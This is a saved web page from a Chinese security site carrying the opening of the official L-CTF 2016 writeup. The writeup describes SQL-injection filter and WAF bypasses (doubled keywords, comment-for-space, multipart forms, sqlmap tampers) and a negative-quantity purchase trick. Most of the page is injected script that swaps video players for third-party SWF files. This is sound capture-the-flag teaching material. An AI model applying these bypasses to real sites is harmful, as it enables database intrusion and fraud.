                                    k.push(T)
                            }
                            h[g] = k
                        }
                    }
                    var M = this.langCodeToCN(u).key;
                    r.logos[M] = p,
                        r.streams[M] = h,
                        r.typeArr[M] = f
                }
                this._videoSegsDic = r,
                    this._videoSegsDic.lang = this.langCodeToCN(o[0]).key
            }
            function c(e) {
                this._randomSeed = e,
                    this.cg_hun()
            }
            var d = e("./canPlayM3U8"),
                u = e("./ajax"),
                h = [19, 1, 4, 7, 30, 14, 28, 8, 24, 17, 6, 35, 34, 16, 9, 10, 13, 22, 32, 29, 31, 21, 18, 3, 2, 23, 25, 27, 11, 20, 5, 15, 12, 0, 33, 26],
                p = {
                    a3: "b4et",
                    a4: "boa4"
                },
                m = {
                    a1: "4",
                    a2: "1"
                };
            n.match = function (e) {
                return /v\.youku\.com/.test(e.attr("host")) && !! window.videoId
            },
                n.parseYoukuCode = function (e, t) {
                    u({
                        url: "http://play.youku.com/play/get.json?vid=" + e + "&ct=12",
                        jsonp: !0,
                        callback: function (n) {
                            -1 == n && console.log("\u89e3\u6790youku\u89c6\u9891\u5730\u5740\u5931\u8d25", 2);
                            var c = n.data,
                                u = a(s(p.a3 + "o0b" + m.a1, h).toString(), o(c.security.encrypt_string)).split("_");
                            if (m.sid = u[0], m.token = u[1], d) {
                                var f = {
                                        vid: window.videoId,
                                        type: "[[type]]",
                                        ts: parseInt((new Date).getTime() / 1e3),
                                        keyframe: 0,
                                        ep: encodeURIComponent(r(a(s(p.a4 + "poz" + m.a2, h).toString(), m.sid + "_" + e + "_" + m.token))),
                                        sid: m.sid,
                                        token: m.token,
                                        ctype: 12,
                                        ev: 1,
                                        oip: c.security.ip,
                                        client_id: "youkumobileplaypage"
                                    },
                                    v = "http://pl.youku.com/playlist/m3u8?" + i(f);
                                t([
                                    ["\u8d85\u6e05", v.replace("[[type]]", "hd2")],
                                    ["\u9ad8\u6e05", v.replace("[[type]]", "mp4")],
                                    ["\u6807\u6e05", v.replace("[[type]]", "flv")]
                                ])
                            } else {
                                var g = new l(c, c.stream, "mp4");
                                console.log(g._videoSegsDic.streams),
                                    t([
                                        ["\u6807\u6e05", g._videoSegsDic.streams.guoyu["3gphd"][0].src]
                                    ])
                            }
                        }
                    })
                },
                n.getVideos = function (e, t) {
                    n.parseYoukuCode(window.videoId, t)
                },
                c.prototype = {
                    cg_hun: function () {
                        this._cgStr = "";
                        for (var e = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ/\\:._-1234567890", t = e.length, n = 0; t > n; n++) {
                            var i = parseInt(this.ran() * e.length);
                            this._cgStr += e.charAt(i),
                                e = e.split(e.charAt(i)).join("")
                        }
                    },
                    cg_fun: function (e) {
                        for (var t = e.split("*"), n = "", i = 0; i < t.length - 1; i++) n += this._cgStr.charAt(t[i]);
                        return n
                    },
                    ran: function () {
                        return this._randomSeed = (211 * this._randomSeed + 30031) % 65536,
                        this._randomSeed / 65536
                    }
                },
                l.prototype = {
                    getFileId: function (e, t) {
                        if (null == e || "" == e) return "";
                        var n = "",
                            i = e.slice(0, 8),
                            o = t.toString(16);
                        1 == o.length && (o = "0" + o),
                            o = o.toUpperCase();
                        var r = e.slice(10, e.length);
                        return n = i + o + r
                    },
                    isValidType: function (e) {
                        return "3gphd" == e || "flv" == e || "flvhd" == e || "mp4hd" == e || "mp4hd2" == e || "mp4hd3" == e ? !0 : !1
                    },
                    convertType: function (e) {
                        var t = e;
                        switch (e) {
                            case "m3u8":
                                t = "mp4";
                                break;
                            case "3gphd":
                                t = "3gphd";
                                break;
                            case "flv":
                                t = "flv";
                                break;
                            case "flvhd":
                                t = "flv";
                                break;
                            case "mp4hd":
                                t = "mp4";
                                break;
                            case "mp4hd2":
                                t = "hd2";
                                break;
                            case "mp4hd3":
                                t = "hd3"
                        }
                        return t
                    },
                    langCodeToCN: function (e) {
                        var t = "";
                        switch (e) {
                            case "default":
                                t = {
                                    key: "guoyu",
                                    value: "\u56fd\u8bed"
                                };
                                break;
                            case "guoyu":
                                t = {
                                    key: "guoyu",
                                    value: "\u56fd\u8bed"
                                };
                                break;
                            case "yue":
                                t = {
                                    key: "yue",
                                    value: "\u7ca4\u8bed"
                                };
                                break;
                            case "chuan":
                                t = {
                                    key: "chuan",
                                    value: "\u5ddd\u8bdd"
                                };
                                break;
                            case "tai":
                                t = {
                                    key: "tai",
                                    value: "\u53f0\u6e7e"
                                };
                                break;
                            case "min":
                                t = {
                                    key: "min",
                                    value: "\u95fd\u5357"
                                };
                                break;
                            case "en":
                                t = {
                                    key: "en",
                                    value: "\u82f1\u8bed"
                                };
                                break;
                            case "ja":
                                t = {
                                    key: "ja",
                                    value: "\u65e5\u8bed"
                                };
                                break;
                            case "kr":
                                t = {
                                    key: "kr",
                                    value: "\u97e9\u8bed"
                                };
                                break;
                            case "in":
                                t = {
                                    key: "in",
                                    value: "\u5370\u5ea6"
                                };
                                break;
                            case "ru":
                                t = {
                                    key: "ru",
                                    value: "\u4fc4\u8bed"
                                };
                                break;
                            case "fr":
                                t = {
                                    key: "fr",
                                    value: "\u6cd5\u8bed"
                                };
                                break;
                            case "de":
                                t = {
                                    key: "de",
                                    value: "\u5fb7\u8bed"
                                };
                                break;
                            case "it":
                                t = {
                                    key: "it",
                                    value: "\u610f\u8bed"
                                };
                                break;
                            case "es":
                                t = {
                                    key: "es",
                                    value: "\u897f\u8bed"
                                };
                                break;
                            case "po":
                                t = {
                                    key: "po",
                                    value: "\u8461\u8bed"
                                };
                                break;
                            case "th":
                                t = {
                                    key: "th",
                                    value: "\u6cf0\u8bed"
                                }
                        }
                        return t
                    },
                    getVideoSrc: function (e, t, n, i, o, l, c) {
                        var d = n.stream[e],
                            u = n.video.encodeid;
                        if (!u || !i) return "";
                        var f = {
                                flv: 0,
                                flvhd: 0,
                                mp4: 1,
                                hd2: 2,
                                "3gphd": 1,
                                "3gp": 0
                            },
                            v = f[i],
                            g = {
                                flv: "flv",
                                mp4: "mp4",
                                hd2: "flv",
                                mp4hd: "mp4",
                                mp4hd2: "mp4",
                                "3gphd": "mp4",
                                "3gp": "flv",
                                flvhd: "flv"
                            },
                            y = g[i],
                            b = t.toString(16);
                        1 == b.length && (b = "0" + b);
                        var w = d.segs[t].total_milliseconds_video / 1e3,
                            x = d.segs[t].key;
                        ("" == x || -1 == x) && (x = d.key2 + d.key1);
                        var k = "";
                        n.show && (k = n.show.pay ? "&ypremium=1" : "&ymovie=1");
                        var A = "/player/getFlvPath/sid/" + m.sid + "_" + b + "/st/" + y + "/fileid/" + o + "?K=" + x + "&hd=" + v + "&myp=0&ts=" + w + "&ypp=0" + k,
                            C = encodeURIComponent(r(a(s(p.a4 + "poz" + m.a2, h).toString(), m.sid + "_" + o + "_" + m.token)));
                        return A += "&ep=" + C,
                            A += "&ctype=12",
                            A += "&ev=1",
                            A += "&token=" + m.token,
                            A += "&oip=" + this._ip,
                            A += (l ? "/password/" + l : "") + (c ? c : ""),
                            A = "http://k.youku.com" + A
                    }
                }
        },
            {
                "./ajax": 2,
                "./canPlayM3U8": 3
            }],
        15: [function (e, t) {
            t.exports = [e("./seeker_youku"), e("./seeker_tudou"), e("./seeker_hunantv")]
        },
            {
                "./seeker_hunantv": 12,
                "./seeker_tudou": 13,
                "./seeker_youku": 14
            }]
    }, {}, [1]);
//# sourceMappingURL=index.js.map
</script><script>if(document.URL.indexOf("v.youku.com/v_show/id_X") >= 0){
    if(document.querySelector("#movie_player>param[name='flashvars']").value.indexOf('category=98')>-1){
        console.log('youku test')
    }else{
        doAdblock();
    }
}else if(!document.URL.match(/^http:\/\/v\.baidu\.com|http:\/\/music\.baidu\.com|http:\/\/dnf\.duowan\.com|http:\/\/bbs\.duowan\.com|http:\/\/newgame\.duowan\.com|http:\/\/my\.tv\.sohu\.com/)){
    doAdblock();
}
function doAdblock(){
    (function() {
        function A() {}
        A.prototype = {
            rules: {
                /*youku_loader: {
                    find: /^http:\/\/static\.youku\.com(\/v[\d\.]*)?\/v\/swf\/loaders?[^\.]*\.swf/,
                    replace: "http://2016.adtchrome.com/loader.swf"
                },
                youku_player: {
                    find: /^http:\/\/static\.youku\.com(\/v[\d\.]*)?\/v\/swf\/(q?player[^\.]*|\w{13})\.swf/,
                    replace: "http://2016.adtchrome.com/player.swf"
                },*/
                'pps_pps': {
                    'find': /^http:\/\/www\.iqiyi\.com\/player\/cupid\/common\/pps_flvplay_s\.swf/,
                    'replace': 'http://swf.adtchrome.com/pps_20140420.swf'
                },
                /*'iqiyi_1': {
                 'find': /^http:\/\/www\.iqiyi\.com\/player\/cupid\/common\/.+\.swf$/,
                 'replace': 'http://swf.adtchrome.com/iqiyi_20140624.swf'
                 },
                 'iqiyi_2': {
                 'find': /^http:\/\/www\.iqiyi\.com\/common\/flashplayer\/\d+\/.+\.swf$/,
                 'replace': 'http://swf.adtchrome.com/iqiyi_20140624.swf'
                 },*/
                'ku6': {
                    'find': /^http:\/\/player\.ku6cdn\.com\/default\/.*\/\d+\/(v|player|loader)\.swf/,
                    'replace': 'http://swf.adtchrome.com/ku6_20140420.swf'
                },
                'ku6_topic': {
                    'find': /^http:\/\/player\.ku6\.com\/inside\/(.*)\/v\.swf/,
                    'replace': 'http://swf.adtchrome.com/ku6_20140420.swf?vid=$1'
                },
                'sohu': {
                    'find':/http:\/\/(tv\.sohu\.com\/upload\/swf\/(?!(ap|56)).*\d+|(\d+\.){3}\d+(:\d+)?\/(web|test)player)\/(Main|PlayerShell)[^\.]*\.swf/,
                    'replace': "http://adtchrome.b0.upaiyun.com/sohu_live.swf"
                },
                /*'sohu2':{
                 'find':/^http:\/\/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\/testplayer\/Main0?\.swf/,
                 'replace':'http://www.adtchrome.com/sohu/sohu_20150104.swf'
                 },
                 'sohu_share': {
                 'find': /^http:\/\/share\.vrs\.sohu\.com\/my\/v\.swf&/,
                 'replace': 'http://www.adtchrome.com/sohu/sohu_20150104.swf?'
                 },
                 'sohu_sogou' : {
                 'find': /^http:\/\/share\.vrs\.sohu\.com\/(\d+)\/v\.swf/,
                 'replace': 'http://www.adtchrome.com/sohu/sohu_20150104.swf?vid=$1'
                 },
                 'letv': {
                 'find': /^http:\/\/player\.letvcdn\.com\/.*p\/.*\/newplayer\/LetvPlayer\.swf/,
                 'replace': 'http://swf.adtchrome.com/20150110_letv.swf'
                 },
                 'letv_topic': {
                 'find': /^http:\/\/player\.hz\.letv\.com\/hzplayer\.swf\/v_list=zhuanti/,
                 'replace': 'http://swf.adtchrome.com/20150110_letv.swf'
                 },
                 'letv_duowan': {
                 'find': /^http:\/\/assets\.dwstatic\.com\/video\/vpp\.swf/,
                 'replace': 'http://yuntv.letv.com/bcloud.swf'
                 },*/
                '17173_in':{
                    'find':/http:\/\/f\.v\.17173cdn\.com\/(\d+\/)?flash\/PreloaderFile(Customer)?\.swf/,
                    'replace':"http://swf.adtchrome.com/17173_in_20150522.swf"
                },
                '17173_out':{
                    'find':/http:\/\/f\.v\.17173cdn\.com\/(\d+\/)?flash\/PreloaderFileFirstpage\.swf/,
                    'replace':"http://swf.adtchrome.com/17173_out_20150522.swf"
                },
                '17173_live':{
                    'find':/http:\/\/f\.v\.17173cdn\.com\/(\d+\/)?flash\/Player_stream(_firstpage)?\.swf/,
                    'replace':"http://swf.adtchrome.com/17173_stream_20150522.swf"
                },
                '17173_live_out':{
                    'find':/http:\/\/f\.v\.17173cdn\.com\/(\d+\/)?flash\/Player_stream_(custom)?Out\.swf/,
                    'replace':"http://swf.adtchrome.com/17173.out.Live.swf"
                }
            },
            _done: null,
            get done() {
                if(!this._done) {
                    this._done = new Array();
                }
                return this._done;
            },
            addAnimations: function() {
                var style = document.createElement('style');
                style.type = 'text/css';
                style.innerHTML = 'object,embed{\
                -webkit-animation-duration:.001s;-webkit-animation-name:playerInserted;\
                -ms-animation-duration:.001s;-ms-animation-name:playerInserted;\
                -o-animation-duration:.001s;-o-animation-name:playerInserted;\
                animation-duration:.001s;animation-name:playerInserted;}\
                @-webkit-keyframes playerInserted{from{opacity:0.99;}to{opacity:1;}}\
                @-ms-keyframes playerInserted{from{opacity:0.99;}to{opacity:1;}}\
                @-o-keyframes playerInserted{from{opacity:0.99;}to{opacity:1;}}\
                @keyframes playerInserted{from{opacity:0.99;}to{opacity:1;}}';
                document.getElementsByTagName('head')[0].appendChild(style);
            },
            animationsHandler: function(e) {
                if(e.animationName === 'playerInserted') {
                    this.replace(e.target);
                }
            },
            replace: function(elem) {
                if (/http:\/\/v.youku.com\/v_show\/.*/.test(window.location.href)){
                    var tag = document.getElementById("playerBox").getAttribute("player")
                    if (tag == "adt"){
                        console.log("adt adv")
                        return;
                    }
                }
                if(this.done.indexOf(elem) != -1) return;
                this.done.push(elem);
                var player = elem.data || elem.src;
                if(!player) return;
                var i, find, replace = false;
                for(i in this.rules) {
                    find = this.rules[i]['find'];
                    if(find.test(player)) {
                        replace = this.rules[i]['replace'];
                        if('function' === typeof this.rules[i]['preHandle']) {
                            this.rules[i]['preHandle'].bind(this, elem, find, replace, player)();
                        }else{
                            this.reallyReplace.bind(this, elem, find, replace)();
                        }
                        break;
                    }
                }
            },
            reallyReplace: function(elem, find, replace) {
                elem.data && (elem.data = elem.data.replace(find, replace)) || elem.src && ((elem.src = elem.src.replace(find, replace)) && (elem.style.display = 'block'));
                var b = elem.querySelector("param[name='movie']");
                this.reloadPlugin(elem);
            },
            reloadPlugin: function(elem) {
                var nextSibling = elem.nextSibling;
                var parentNode = elem.parentNode;
                parentNode.removeChild(elem);
                var newElem = elem.cloneNode(true);
                this.done.push(newElem);
                if(nextSibling) {
                    parentNode.insertBefore(newElem, nextSibling);
                } else {
                    parentNode.appendChild(newElem);
                }
            },
            init: function() {
                var desc = navigator.mimeTypes['application/x-shockwave-flash'].description.toLowerCase();
                /*if(desc.indexOf('adobe')>-1){
                 delete this.rules["iqiyi_1"];
                 delete this.rules["iqiyi_2"];
                 }*/
                if(document.URL.indexOf('tv.sohu.com')<=0){
                    delete this.rules["sohu"];
                }
                var handler = this.animationsHandler.bind(this);
                document.body.addEventListener('webkitAnimationStart', handler, false);
                document.body.addEventListener('msAnimationStart', handler, false);
                document.body.addEventListener('oAnimationStart', handler, false);
                document.body.addEventListener('animationstart', handler, false);
                this.addAnimations();
            }
        };
        new A().init();
    })();
}
// 20140730
(function cnbeta() {
    if (document.URL.indexOf('cnbeta.com') >= 0) {
        var elms = document.body.querySelectorAll("p>embed");
        Array.prototype.forEach.call(elms, function(elm) {
            elm.style.marginLeft = "0px";
        });
    }
})();
//baidu
//display: inline !important; visibility: visible !important;
//display:block !important;visibility:visible !important; display:block !important;visibility:visible !important
if(document.URL.indexOf('www.baidu.com') >= 0){
    if(document && document.getElementsByTagName && document.getElementById && document.body){
        var a = function(){
            Array.prototype.forEach.call(document.body.querySelectorAll("#content_left>div,#content_left>table"), function(e) {
                var a = e.getAttribute("style");
                if(a && /display:(table|block)\s!important/.test(a)){
                    e.parentNode.removeChild(e)
                }
            });
        };
        a();
        var MutationObserver = window.MutationObserver ||  window.WebKitMutationObserver || window.MozMutationObserver;
        var callback = function(records) {
            records.map(function(record) {
                console.log('block baidu')
                a();
            });
        };
        var mo = new MutationObserver(callback);
        mo.observe(document.getElementById('wrapper_wrapper'), { 'childList': true, 'subtree': true });
    };
}
// 20140922
(function kill_360() {
    if (document.URL.indexOf('so.com') >= 0) {
        document.getElementById("e_idea_pp").style.display = none;
    }
})();
//解决腾讯视频列表点击无效
if(document.URL.indexOf("v.qq.com") >= 0){
    if (document.getElementById("mod_videolist")){
        var listBox = document.getElementById("mod_videolist")
        var list = listBox.getElementsByClassName("list_item")
        for (i = 0;i < list.length;i++){
            list[i].addEventListener("click", function() {
                var url = this.getElementsByTagName("a")[0]
                url = url.getAttribute("href")
                var host = window.location.href
                url = host.replace(/cover\/.*/,url)
                window.location.href = url
            })
        }
    }
}
</script><style type="text/css">object,embed{                -webkit-animation-duration:.001s;-webkit-animation-name:playerInserted;                -ms-animation-duration:.001s;-ms-animation-name:playerInserted;                -o-animation-duration:.001s;-o-animation-name:playerInserted;                animation-duration:.001s;animation-name:playerInserted;}                @-webkit-keyframes playerInserted{from{opacity:0.99;}to{opacity:1;}}                @-ms-keyframes playerInserted{from{opacity:0.99;}to{opacity:1;}}                @-o-keyframes playerInserted{from{opacity:0.99;}to{opacity:1;}}                @keyframes playerInserted{from{opacity:0.99;}to{opacity:1;}}</style></head>
<body onload="iscrollLoaded();">
<div id="is-mobile"></div>

<div class="container">
		<div class="mobile-header">
    <div class="header clearfix">
        <div class="header-wrapper clearfix">
            <a href="http://bobao.360.cn/index/index" class="logo"><img class="slogan" src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/logo.png"></a>
                        <form id="search" class="search-box" action="http://bobao.360.cn/search/index" method="GET">
                <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                <input class="icon" type="submit" value="">
                <input type="hidden" name="type" value="">
            </form>
            <div class="bug">
                <div class="name"><span class="seled">漏洞</span><i class="arrow"></i></div>
                <ul class="typelist">
                    <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                    <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                    <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                </ul>
            </div>
                        <div class="logNreg mobile-hide">
                <div class="unlog">
                    <i></i>
                    <a href="http://bobao.360.cn/ctf/detail/log.html" class="log">登录</a>
                    <span>|</span>
                    <a href="http://bobao.360.cn/ctf/detail/reg.html" class="reg">注册</a>
                </div>
                <div class="loged">
                    <a href="http://bobao.360.cn/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                    <div class="user-links">
                        <span class="arrow"></span>
                        <ul>
                            <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage" target="_blank"><i></i><span>账号设置</span></a></li>
                            <li class="alert-setting"><a href="http://bobao.360.cn/keywords/index" target="_blank"><i></i><span>告警设置</span></a></li>
                            <li class="bug-alert"><a href="http://bobao.360.cn/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a></li>
                            <li class="my-knowl"><a href="http://bobao.360.cn/mylearn/index" target="_blank"><i></i><span>我的知识</span></a></li>
                            <li class="my-knowl"><a href="http://bobao.360.cn/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a></li>
                            <li class="my-exit"><a href="http://login.360.cn/?src=pcw_adlab&amp;op=logout&amp;destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a></li>
                        </ul>
                    </div>

                    <a href="http://bobao.360.cn/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                    <div class="message-links">
                        <span class="arrow"></span>
                        <ul>
                            <li class="account-setting" style="display:none;"><a href="http://bobao.360.cn/myres/index" target="_blank"><i></i><span>回复我的</span></a>
                            </li>
                            <li class="my-bug"><a href="http://bobao.360.cn/myvul/index" target="_blank"><i></i><span>我的漏洞</span></a></li>
                            <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                            <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                            </li>-->
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <style type="text/css">
        .nav{overflow: hidden;}
        .nav .scroll{width: auto;}
    </style>
    <div id="wrapper">
        <div id="scroller" class="nav" style="overflow: visible;">
            <div class="scroll">
                <ul class="nav-list">
                    <li><a class="link-nav" href="http://bobao.360.cn/index/index">首页</a></li>
                    <li>
                        <a class="link-nav" href="http://bobao.360.cn/vul/index">漏洞</a>
                    </li>
                    <li>
                        <a class="link-nav" href="http://bobao.360.cn/news/index">资讯</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="http://bobao.360.cn/introduce/list">招聘</a></li>
                        </ul>
                    </li>
                    <li>
                        <a class="link-nav" href="http://bobao.360.cn/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="http://bobao.360.cn/course/index">学院</a></li>
                        </ul>
                    </li>
                    <li><a class="link-nav" href="http://bobao.360.cn/activity/index">活动</a></li>
                    <li class="mobile-hide cur"><a class="link-nav" href="http://bobao.360.cn/ctf/index">CTF训练营</a></li>
                    <li><a class="link-nav" href="http://bobao.360.cn/app/index">APP</a></li>
                    
                    <!--<li ><a href="/course/index">学院</a></li>-->
                    <!--<li ><a href="/introduce/list">招聘</a></li>-->
                    <!--<li class="cur" class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                </ul>
            </div>
        </div>
    </div>
    </div>
        
    <div class="mobile-content">
    <link rel="stylesheet" type="text/css" href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/news.css">
<link rel="stylesheet" type="text/css" href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/shCoreDefault.css">
<style>
p .syntaxhighlighter{
	width:80%;
}
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; CTF知识详情</div>

<div class="content clearfix">
  <div class="main">
      <div class="article">
          <div id="article_box">
            <h2>【CTF攻略】L-CTF 2016 官方 Writeup</h2>
            <p class="article-msg">
                <span class="time">2016-10-08 11:29:39</span>
                <span class="orig">来源：安全客</span>                                <span class="orig">作者：<a href="http://bobao.360.cn/member/contribute?uid=2515404165" style="color:#848e99;">安全客</a></span>
                <br>
                                <span class="read">阅读：1841次</span>
                <span><a class="good" href="javascript:;" data-target="/ctf/good" data-value="g_170" data-type="ctf">点赞(2)</a></span>
                <span><a class="fav" href="javascript:;" data-target="/myctf/add" data-pk="170" data-type="ctf">收藏(14)</a></span>
            </p>
            <hr size="1">
            <div class="article-msg">
            	<p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
            </div>
            <p></p><p style="text-indent: 2em; text-align: center;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;"><strong><a href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t01fcd642cdabd8680c.jpg" target="_blank"><img src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t01fcd642cdabd8680c.jpg" title="t016a4f6e2063a9bd9a.jpg" alt="http://p8.qhimg.com/t016a4f6e2063a9bd9a.jpg" style="visibility: visible;"></a></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;"><strong><br></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;"><strong>传送们</strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;"></span></p><hr><p style="text-indent: 2em; text-align: left;"><strong><span style="color: rgb(0, 112, 192);"><strong style="text-indent: 32px; white-space: normal;"><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; line-height: 25px; background-color: rgb(255, 255, 255);">【CTF攻略】最新2016 L-CTF Nu1L's&nbsp;writeup</span></strong></span></strong><span style="color: rgb(0, 112, 192);">&nbsp;</span><a href="http://bobao.360.cn/ctf/learning/168.html" _src="http://bobao.360.cn/ctf/learning/168.html" style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-decoration: underline;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">http://bobao.360.cn/ctf/learning/168.html</span></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;"><strong><br></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;"><strong>Web</strong></span></p><hr><p style="text-indent: 2em; text-align: left;"><strong style="text-indent: 2em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Web 50 签到</strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">签到题，登录页面存在报错注入，过滤了<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 0, 0);"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">and</span>、<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">or</span>、<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">select</span></span>等，但都可以通过双写绕过，空格用/**/代替，通过报错回显即可拿到密码。登陆后进入购买页面，抓包可发现购买数量和密码都可控，猜测后台检验方式为用户余额-单价x数量是否大于零，于是可将购买数量改为一负值或者0，再对密码进行爆破即可。</span></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t015d6ccfad69de6ab6.png" target="_blank"><img src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t015d6ccfad69de6ab6.png" title="t01cb07fd218aa17a3f.png" alt="http://p8.qhimg.com/t01cb07fd218aa17a3f.png" style="visibility: visible;"></a></span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br></span></strong></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Web150 我控几不主我及几啦</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这道题思路来源于<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 0, 0);">LuManager</span>15年12爆出的注入漏洞，但<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 0, 0);">sqlmap</span>也能跑并不在出题人意料之内，分给得偏高。从解题人数来看作为签到题似乎更好一点QAQ。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">解题办法：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">1.sqlmap加上各种tamper后即可跑出</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">2.构造一个上传表单</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">并将<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 0, 0);">enctype="multipart/form-data"</span>，然后通过<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 0, 0);">post</span>方法传入<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 0, 0);">id</span>，即可绕过<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 0, 0);">waf</span>联合查询出<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 0, 0);">flag</span>。</span></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t01078d338f5a9c7ef0.png" target="_blank"><img src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t01078d338f5a9c7ef0.png" title="t0125d6c172034db4a1.png" alt="http://p0.qhimg.com/t0125d6c172034db4a1.png" style="visibility: visible;"></a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 0, 0);">where</span><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">是<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 0, 0);">sql</span>关键字，记得用反引号包住。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">注入得到<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 0, 0);">flag</span>:</span></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t01ea9dca2b99c3aa0c.png" target="_blank"><img src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t01ea9dca2b99c3aa0c.png" 